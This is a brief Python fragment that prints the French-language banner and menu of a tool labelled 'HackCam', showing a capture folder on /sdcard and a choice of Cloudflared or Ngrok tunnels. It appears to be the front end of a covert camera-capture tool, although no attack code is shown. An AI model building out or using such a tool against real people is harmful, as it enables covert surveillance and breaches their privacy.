...
def digital_banner():
    ...
    print("═══════════════════════════════════════════════")
    print("\033[1;33m")
    print("⭐ SKY PLUG CDM - Le meilleur dev, une légende vivante ⭐")
    print("\033[1;36m")
    print("💪 Famille CDM - Unis comme jamais, plus forts ensemble 💪")
    print("\033[1;32m")
    print("⚡ CDM 503 | HackCam")
    print("🗂️ Dossier de capture : /sdcard/CDM503_HackCam")
    print("[1] Cloudflared")
    print("[2] Ngrok\n")
